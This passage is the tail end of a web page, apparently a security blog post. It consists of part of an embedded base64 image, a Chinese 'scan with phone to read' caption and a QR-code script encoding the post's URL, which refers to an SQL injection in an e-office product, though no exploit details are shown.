Qnuu8o/0bSCPTFfu793AYSCQpwdGfPVIPiWQPnL7dK6+Qkgf8xAOR9Tz6h76xd5HHbKneRGiw4jmn8HDQJ4pujx/7gZ+eyAwfxogukeHcJijvo4+lSvdfKGeWldA9qr1PvSJEB8E1UWIDkF7Qbg+9TO+ypf+2wOpJlf8fzfwxwbi03KGvhQYnzYIh6C+V9C9rYH0Uodw82e6ef1i1+Uw9tffUX/hHxtI3/Tiz93AYSA1pVms2nXvygd5WmDEXg/Jq/d+K33vg/SAoDlrYdTNw6iv/BBfz0N0+5kX1WH0qRceBlLiFe+7gW0gkKnBY1wdFcY6fRC9PyXmRYhvxc/qq27lgfSGYPd1Xr0qIP5aV8DIS6s4q4fUQbBqKiAc7rgNpAxXvP8GroG8fwbDCf4DAAD//3aZyNMAAAAGSURBVAMA9QlZ2gV0a6MAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-general-officeitem-sort-validate\_sort-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 